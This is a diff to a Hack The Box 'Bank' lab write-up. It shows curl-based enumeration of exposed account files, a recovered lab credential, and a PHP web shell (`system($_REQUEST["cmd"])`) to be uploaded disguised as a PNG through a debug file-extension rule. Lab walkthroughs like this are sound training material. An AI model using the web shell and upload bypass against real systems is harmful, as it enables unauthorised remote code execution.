@@ -544,11 +544,13 @@ The scan provides valuable insights into potential security issues and vulnerabi
 $ curl -sL http://bank.htb/balance-transfer | grep -i '.acc' | wc -l
 999
 
------------
+-------------------------------------------------------------------------------
 
 # number of files not ending with .acc
 $ curl -sL http://bank.htb/balance-transfer | grep -iv '.acc' | wc -l
 15
+
+-------------------------------------------------------------------------------
 
 # get the first 10 line after sorting at second field
 $ curl -sL http://bank.htb/balance-transfer | grep -i '.acc' | grep -ioE '[a-f0-9]{32}\.acc.*"right">.+ ' | cut -d '>' -f1,7 | tr '">' ' ' | sort -k2 | head
@@ -563,6 +565,8 @@ $ curl -sL http://bank.htb/balance-transfer | grep -i '.acc' | grep -ioE '[a-f0-
 70b43acf0a3e285c423ee9267acaebb2.acc  582 
 780a84585b62356360a9495d9ff3a485.acc  582
 
+-------------------------------------------------------------------------------
+
 # stats on the byte sizes
 $ curl -sL http://bank.htb/balance-transfer | grep -i '.acc' | grep -ioE '[a-f0-9]{32}\.acc.*"right">.+ ' | cut -d '>' -f1,7 | tr '">' ' ' | cut -d ' ' -f3 | sort | uniq -c
       1 257
@@ -572,9 +576,13 @@ $ curl -sL http://bank.htb/balance-transfer | grep -i '.acc' | grep -ioE '[a-f0-
     590 584
     298 585
 
+-------------------------------------------------------------------------------
+
 # get the one file of 257 byte size 
 $ curl -sL http://bank.htb/balance-transfer | grep -i '.acc' | grep -ioE '[a-f0-9]{32}\.acc.*"right">.+ ' | cut -d '>' -f1,7 | tr '">' ' ' | grep -iE '\b257\b'
 68576f20e9732f1b2edc4df5b8533230.acc  257
+
+-------------------------------------------------------------------------------
 
 # check out the file
 $ curl -sL http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc
@@ -592,17 +600,25 @@ Transactions: 39
 Balance: 8842803 .
 ===UserAccount===
 
+-------------------------------------------------------------------------------
+
 # record the creds
 vi creds.txt
 chris@bank.htb:!##HTBB4nkP4ssw0rd!##
+
+-------------------------------------------------------------------------------
 
 # now login with the username and password at http://bank.htb 
 # you should be able to login to the account
 # Start looking for the place to upload files since we know that there is a directory for upload. 
 # Go to Support page in Chris's account and test upload a random png file while Burp Suite intercepts the traffic. It will capture the request and response for the upload.
 
+-------------------------------------------------------------------------------
+
 # craft the request with first three lines started with PNG magic byte and place php code execution inside the png file as below. Note that \n "Show non-printable chars" must be turned on to see the same output.
 <?php system($_REQUEST["cmd"]); ?>
+
+-------------------------------------------------------------------------------
 
 # with further enumertion, check the source code of bank.htb/support.php page and find there is a DEBUG block in it. 
 <!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
@@ -651,6 +667,8 @@ It's a series of actions against the target URL `http://bank.htb/balance-transfe
 10. **Source Code Inspection**:
     - It suggests inspecting the source code of `bank.htb/support.php` and mentions a debug block added for executing `.htb` files as PHP for debugging purposes.
 
-Overall, the script demonstrates a systematic approach to exploring and interacting with a web application, including enumeration of files, extraction of sensitive information, and identification of potential vulnerabilities for further exploitation.
+It demonstrates a systematic approach to exploring and interacting with a web application, including enumeration of files, extraction of sensitive information, and identification of potential vulnerabilities for further exploitation.
+
+
 ## Exploits
 
